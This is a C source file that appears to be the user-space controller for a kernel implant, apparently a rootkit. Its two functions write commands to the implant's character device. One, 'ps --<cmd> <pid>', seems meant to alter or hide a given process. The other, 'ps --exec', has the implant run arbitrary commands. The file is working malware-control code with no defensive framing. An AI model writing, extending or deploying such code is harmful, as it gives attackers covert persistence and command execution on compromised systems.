#include <client.h>
#include <process.h>
#include <debug.h>
#include <commands.h>

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int modify_proc(char *cmd, pid_t pid)
{
	FILE *implant = fopen(IMPLANT_CHRDEV_PATH, "w");
	if (implant == NULL) {
		IMLOG_WARN("Failed to access the implant interface");
		return -1;
	}

	int ret = fprintf(implant, "ps --%s %d", cmd, pid);
	if (ret <= 0) {
		IMLOG_DEBUG("Failed to write to the implant interface");
	} else {
		ret = 0;
	}

	fclose(implant);
	return ret;
}

int exec_proc(char *args)
{
	int ret = 0;
	FILE *implant = fopen(IMPLANT_CHRDEV_PATH, "w");
	if (!implant) {
		ret = -1;
		IMLOG_WARN("Failed to access the implant interface");
		goto err;
	}

	ret = fprintf(implant, "ps --exec %s", args);
	if (ret > 0) {
		ret = 0;
	}

err_fclose:
	fclose(implant);
err:
	return ret;
}
